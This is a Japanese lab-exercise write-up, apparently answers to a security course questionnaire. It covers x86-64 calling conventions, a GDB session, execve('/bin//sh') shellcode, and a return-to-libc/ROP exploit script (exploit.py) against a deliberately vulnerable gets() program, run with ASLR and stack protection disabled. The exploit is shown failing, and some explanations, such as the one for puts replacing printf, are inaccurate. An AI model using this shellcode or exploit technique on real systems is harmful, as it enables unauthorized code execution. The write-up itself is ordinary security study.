@@ -1,0 +1,460 @@
+1. [必須]
+x86-64アーキテクチャ（レジスタ、命令コード等）について、x86との違いも含め詳細に説明してください。
+また、Linuxにおける関数・システムコールそれぞれの呼び出し規約について説明してください。
+--------------------------------------------------------------------------------------------------------------------
+以下、回答
+--------------------------------------------------------------------------------------------------------------------
+.x86-64レジスタ
+x86-64な汎用レジスタ(幅64bit)はRAX,RBX,RCX,RSI,RDI,RBP,RSP,R8-R15がある。
+
+・x86-64関数呼出規約
+RDI, RSI, RDX, RCX, R8, R9レジスタは整数型とポインタ型の引数に、
+XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6, XMM7は浮動小数点型引数に用いられる。
+返り値はRAXに格納される。
+
+・x86-64システムコール呼出規約
+システムコール番号はRAXに設定する。
+引数としてRDI,RSI,RDX,R10,R8,R9を利用する。(各第1,2,3...引数となる)
+syscallを利用する。
+--------exitの呼び出し 例(Intel記法)-------------------------
+        mov     rax,0x3c                # syscallnum(60) exit
+        xor     rdi,rdi                 # code 0
+        syscall                         # syscall
+--------------------------------------------------------------        
+・x86-64命令
+x86-64の場合REX Prefix(0,1byte)が付く。
+movqやpushqなどの64bit命令がある。(qが付く)
+32bitで処理する場合はmovlになる。(lが付く)
+x86-64の場合movqの命令で64bitまで即値で利用できる
+--------例(Intel記法)------------------------------------------------------------
+		Address			     Bytes                    Opcode
+		0x0000000000401000   48 B8 73656363616D7021   movq rax,0x21706D6163636573
+---------------------------------------------------------------------------------       
+
+x86とx86-64の違い
+・汎用レジスタの数が違う(x86が8、x86-64が16)
+・汎用レジスタのサイズが異なる(x86は4byte(32bit)、x86_64は8byte(64bit))
+・システムコール番号が違う(readの場合:x86は3、x86-64は0)
+・システムコールの呼び出しが違う(x86ではint 0x80、x86_64ではsyscall)
+
+--------------------------------------------------------------------------------------------------------------------
+ここまで
+--------------------------------------------------------------------------------------------------------------------
+2. [必須]
+x86-64のLinuxマシン上で、C言語を使った簡単なプログラム（Hello world相当、内容は自由）を書き、コンパイルしてください。
+さらに、GDB（GNU Debugger）を使ってプログラムの動作を確認し、簡単な説明とともにGDBの実行ログを示してください。
+--------------------------------------------------------------------------------------------------------------------
+以下、回答
+--------------------------------------------------------------------------------------------------------------------
+#動作環境
+$ uname -a
+Linux ubuntu 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:37 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 15.04
+Release:	15.04
+Codename:	vivid
+
+$ gcc --version
+gcc (Ubuntu 4.9.2-10ubuntu13) 4.9.2
+Copyright (C) 2014 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+#今回使用するコード
+----------helloworld.c code----------------------------------------------------
+#include <stdio.h>
+
+int main(void)
+{
+	printf("Hello World\n");
+	return 0;
+}
+-------------------------------------------------------------------------------
+#初期設定でコンパイル
+$ gcc helloworld.c 
+#動作確認
+$ ./a.out 
+Hello World
+
+#gdbでデバッグする
+$ gdb a.out
+#intel記法に変更
+(gdb) set disassembly-flavor intel
+#まずmain関数を逆アセンブルします
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0000000000400536 <+0>:	    push   rbp                 #rbpレジスタをスタックに退避
+   0x0000000000400537 <+1>:	    mov    rbp,rsp             #rbpにスタックフレームをセット
+   0x000000000040053a <+4>:	    mov    edi,0x4005d4        #※1 下記記載
+   0x000000000040053f <+9>:	    call   0x400410 <puts@plt> #※2 下記記載
+   0x0000000000400544 <+14>:	mov    eax,0x0             #戻り値0
+   0x0000000000400549 <+19>:	pop    rbp                 #rbpレジスタを戻す
+   0x000000000040054a <+20>:	ret                        #return
+End of assembler dump.
+
+
+	-※1-------------------------------------------------------------------------
+	(gdb) x/s 0x4005d4
+	アドレス(0x4005d4)のサイズが小さいためedi(32bit)レジスタが利用されている。
+	0x4005d4:	"Hello World"
+	"Hello World"のポインターがediに設定されている。
+	------------------------------------------------------------------------------
+
+	-※2-------------------------------------------------------------------------
+	引数が1つしか設定していないのでエラーを防ぐためにputsがかわりに利用されている。
+	------------------------------------------------------------------------------
+	
+	
+	
+
+#main+9(0x40053f)にブレークポイントを貼りレジスタの内容を確認する
+(gdb) break *main+9
+Breakpoint 1 at 0x40053f
+#実行
+(gdb) run
+Starting program: /home/a/a.out 
+
+Breakpoint 1, 0x000000000040053f in main ()
+#レジスタの内容を確認
+(gdb) info register
+rax            0x400536	        4195638
+rbx            0x0	0
+rcx            0x0	0
+rdx            0x7fffffffe508	140737488348424
+rsi            0x7fffffffe4f8	140737488348408
+rdi            0x4005d4	        4195796              #"Hello World"
+rbp            0x7fffffffe410	0x7fffffffe410
+rsp            0x7fffffffe410	0x7fffffffe410       #スタック
+r8             0x7ffff7dd4dd0	140737351863760
+r9             0x7ffff7de99d0	140737351948752
+r10            0x833	2099
+r11            0x7ffff7a2f950	140737348041040
+r12            0x400440	4195392
+r13            0x7fffffffe4f0	140737488348400
+r14            0x0	0
+r15            0x0	0
+rip            0x40053f	0x40053f <main+9>             #現在のアドレス
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+命令通りrdiに格納されてることが確認できる。
+
+以上。
+--------------------------------------------------------------------------------------------------------------------
+ここまで
+-------------------------------------------------------------------------------------------------------------------- 
+3. [1-D選択者任意]
+x86のLinuxマシンで、シェルを起動するシェルコードを書いてください。
+--------------------------------------------------------------------------------------------------------------------
+以下、回答
+--------------------------------------------------------------------------------------------------------------------
+x86な環境がないため 2の環境で続けます
+まず初めにシェルコードを書きます。
+--------shell code (Intel記法)---------------------------
+        xor rdx,rdx                 #第三引数
+        push rdx
+        mov rax,0x68732f2f6e69622f  #/bin//sh
+        push rax
+        mov  rdi,rsp                #第一引数
+        xor rax,rax
+        push rax
+        push rdi
+        mov rsi,rsp                 #第二引数
+        mov al,3b                   #sysnum 0x3b(59) execve("/bin//sh", {"/bin//sh", NULL}, NULL)
+        syscall
+----------------------------------------------------------
+
+48 31 D2 52 48 B8 2F 62 69 6E 2F 2F 73 68 50 48 8B FC 48 31 C0 50 57 48 8B F4 B0 3B 0F 05
+となります。
+
+--------shellcode.c code---------------------------
+#include <stdio.h>
+#include <string.h>
+
+char *shellcode = "\x48\x31\xd2\x52\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x8B\xFC\x48\x31\xC0\x50\x57\x48\x8B\xF4\xB0\x3B\x0F\x05";
+
+int main(void)
+{
+(*(void(*)()) shellcode)();
+return 0;
+}
+----------------------------------------------------------
+
+#SSPとDEPを無効にしてコンパイルします。
+$ gcc -z execstack -fno-stack-protector shellcode.c
+$ ./a.out
+# 
+# whoami
+root
+
+
+無事シェルが起動しました。
+--------------------------------------------------------------------------------------------------------------------
+ここまで
+-------------------------------------------------------------------------------------------------------------------- 
+4. [2・3-D選択者任意]
+x86のLinuxマシンで、スタックバッファオーバーフロー脆弱性のあるプログラムをC言語で書き、コンパイルしてください。
+さらに、このプログラムに対し、Return-to-libc攻撃によりシェルを起動するエクスプロイトコードを書き、実行してください。
+--------------------------------------------------------------------------------------------------------------------
+以下、回答
+--------------------------------------------------------------------------------------------------------------------
+2,3の環境で続けます
+まず脆弱性のあるプログラムを用意します。(今回ROPを使うのでチート)
+------------test2.c ---------------------------------
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+	char cheat[] = "\x5f\xc3\x58\xc3";
+	char buf[10];
+	gets(buf);
+	puts(buf);
+	return 0;
+}
+-----------------------------------------------------
+今回はSSP無効,ASLR無効,DEP有効にします。
+$ sudo sysctl -w kernel.randomize_va_space=0
+$ gcc -fno-stack-protector test2.c
+#動作を確認します。
+$ ./a.out
+a
+a
+$ ./a.out
+tikuwa
+tikuwa
+#試しにBoFを発生させます。
+$ ./a.out
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (コアダンプ)
+#デバッグしてみます。
+$ gdb a.out
+#intel記法に変更
+(gdb)set disassembly-flavor intel
+#main関数を逆アセンブルしてみます。
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0000000000400586 <+0>:     push   rbp
+   0x0000000000400587 <+1>:     mov    rbp,rsp
+   0x000000000040058a <+4>:     sub    rsp,0x30
+   0x000000000040058e <+8>:     mov    DWORD PTR [rbp-0x24],edi
+   0x0000000000400591 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
+   0x0000000000400595 <+15>:    mov    DWORD PTR [rbp-0x10],0xc358c35f
+   0x000000000040059c <+22>:    mov    BYTE PTR [rbp-0xc],0x0
+   0x00000000004005a0 <+26>:    lea    rax,[rbp-0x20]
+   0x00000000004005a4 <+30>:    mov    rdi,rax				#getsの第一引数
+   0x00000000004005a7 <+33>:    call   0x400480 <gets@plt>
+   0x00000000004005ac <+38>:    lea    rax,[rbp-0x20]
+   0x00000000004005b0 <+42>:    mov    rdi,rax				#putsの第一引数
+   0x00000000004005b3 <+45>:    call   0x400450 <puts@plt>              
+   0x00000000004005b8 <+50>:    mov    eax,0x0				#戻り値0
+   0x00000000004005bd <+55>:    leave
+   0x00000000004005be <+56>:    ret
+End of assembler dump.
+
+#次にputsの引数のポインターを取得します。
+(gdb) b *main+45
+Breakpoint 1 at 0x4005b3
+(gdb) r
+Starting program: /home/a/a.out 
+a
+
+Breakpoint 1, 0x00000000004005b3 in main ()
+(gdb) info register
+rax            0x7fffffffe470   140737488348272
+rbx            0x0      0
+rcx            0x7ffff7dd3980   140737351858560
+rdx            0x7ffff7dd5980   140737351866752
+rsi            0x7ffff7ff5001   140737354092545
+rdi            0x7fffffffe470   140737488348272
+rbp            0x7fffffffe490   0x7fffffffe490
+rsp            0x7fffffffe460   0x7fffffffe460
+r8             0x7ffff7ff5002   140737354092546
+r9             0x0      0
+r10            0x22     34
+r11            0x246    582
+r12            0x400490 4195472
+r13            0x7fffffffe570   140737488348528
+r14            0x0      0
+r15            0x0      0
+rip            0x4005b3 0x4005b3 <main+45>
+eflags         0x246    [ PF ZF IF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+
+#edi = 0x7fffffffe470これですね
+#中身を確認してみます。
+(gdb) x/s 0x7fffffffe470
+0x7fffffffe470:	"a"
+#次にシェルを起動するためにlibc main関数のリターンアドレスを探します。
+#ステップ実行をonにします。
+(gdb)set step-mode on
+#main+45のretにブレークを貼ります
+(gdb) break *main+56
+(gdb) continue
+#ステップ実行します。
+(gdb) step
+#ripをチェック
+(gdb)info register 
+rax            0x0      0
+rbx            0x0      0
+rcx            0x7ffff7ff4000   140737354088448
+rdx            0x7ffff7dd5970   140737351866736
+rsi            0x7ffff7ff4000   140737354088448
+rdi            0x1      1
+rbp            0x4005c0 0x4005c0 <__libc_csu_init>
+rsp            0x7fffffffe4a0   0x7fffffffe4a0
+r8             0xffffffff       4294967295
+r9             0x0      0
+r10            0x22     34
+r11            0x246    582
+r12            0x400490 4195472
+r13            0x7fffffffe570   140737488348528
+r14            0x0      0
+r15            0x0      0
+rip            0x7ffff7a2fa40   0x7ffff7a2fa40 <__libc_start_main+240>　＃リターンアドレス
+eflags         0x246    [ PF ZF IF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+
+
+#0x7ffff7a2fa40がリターンアドレスですね
+#RIPこれを先ほどのputsの引数から探します。
+(gdb) find 0x7fffffffe470,+1000,0x7ffff7a2fa40
+0x7fffffffe498
+1 pattern found.
+#見つかりました
+#次にsystem関数のアドレスと"/bin/sh"を探します。
+(gdb) x system
+0x7ffff7a533d0 <__libc_system>:	0xfa86e90b74ff8548
+#systemのアドレスは0x7ffff7a533d0ですね
+#"/bin/sh"はsystemアドレスより先にあるのでfindで探します
+(gdb) find system,+99999999,"/bin/sh"
+0x7ffff7b9b3dd
+#見つかりました。
+#exitも調べておきます
+(gdb) x exit
+0x7ffff7a48d70 <__GI_exit>:	"H\215\065!\251\070"
+#最後にチートガジェットを探します
+$ objdump -d a.out | grep 5f
+  400595:       c7 45 f0 5f c3 58 c3    movl   $0xc358c35f,-0x10(%rbp)
+  4005f3:       48 85 ed                test   %rbp,%rbp
+  4005f6:       74 1e                   je     400616 <__libc_csu_init+0x56>
+  4005f8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
+  4005ff:       00
+  400622:       41 5f                   pop    %r15
+
+#0x400598 pop rdi; ret
+#0x40059a pop rax; ret
+#見つかりました。
+
+#ここでアドレスが揃ったのでコードを書いていきます。
+buffer = 0x7fffffffe470
+retbuf = 0x7fffffffe498
+system = 0x7ffff7a533d0
+binsh  = 0x7ffff7b9b3dd
+exit   = 0x7ffff7a48d70
+poprdi = 0x400598
+poprax = 0x40059a
+
+スタックは下記の様に積んでいきます
+----------------------------
+"A"*40 #retbuf - buffer = 40
+----------------------------
+poprdi
+----------------------------
+binsh
+----------------------------
+poprax
+----------------------------
+0
+----------------------------
+system
+----------------------------
+poprdi
+----------------------------
+0
+----------------------------
+exit
+----------------------------
+
+----------------exploit.py------------
+import sys
+import struct
+from subprocess import Popen
+
+buffer = 0x7fffffffe470
+retbuf = 0x7fffffffe498
+system = 0x7ffff7a533d0
+binsh  = 0x7ffff7b9b3dd
+exit   = 0x7ffff7a48d70
+poprdi = 0x400598
+poprax = 0x40059a
+offset = retbuf - buffer
+buf = "A" * offset
+buf += struct.pack('<Q', poprdi)
+buf += struct.pack('<Q', binsh)
+buf += struct.pack('<Q', poprax)
+buf += struct.pack('<Q', 0)
+buf += struct.pack('<Q', system)
+buf += struct.pack('<Q', poprdi)
+buf += struct.pack('<Q', 0)
+buf += struct.pack('<Q', exit)
+
+print buf
+--------------------------------------
+$ python exploit.py | ./a.out
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+#!?!? wtf　起動しません;;
+#一応処理追いました以下
+$ python exploit.py > input
+$ gdb a.out
+(gdb) set step-mode on
+(gdb) b *main+56
+(gdb) r < input
+Starting program: /home/a/a.out < input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+
+Breakpoint 1, 0x00000000004005be in main ()
+(gdb) n
+0x0000000000400598 in main ()
+(gdb) x/5i 0x400598
+=> 0x400598 <main+18>:  pop    %rdi
+   0x400599 <main+19>:  retq
+   0x40059a <main+20>:  pop    %rax
+   0x40059b <main+21>:  retq
+   0x40059c <main+22>:  movb   $0x0,-0xc(%rbp)
+(gdb) n
+0x000000000040059a in main ()
+(gdb) n
+0x000000000040059b in main ()
+(gdb) n
+__libc_system (line=0x7ffff7b9b3dd "/bin/sh") at ../sysdeps/posix/system.c:179
+179     ../sysdeps/posix/system.c: そのようなファイルやディレクトリはありません.
+(gdb) c
+Continuing.
+[Inferior 1 (process 3466) exited normally]
+
+##よくわかりません
+
+--------------------------------------------------------------------------------------------------------------------
+ここまで
+-------------------------------------------------------------------------------------------------------------------- 
+以上です。
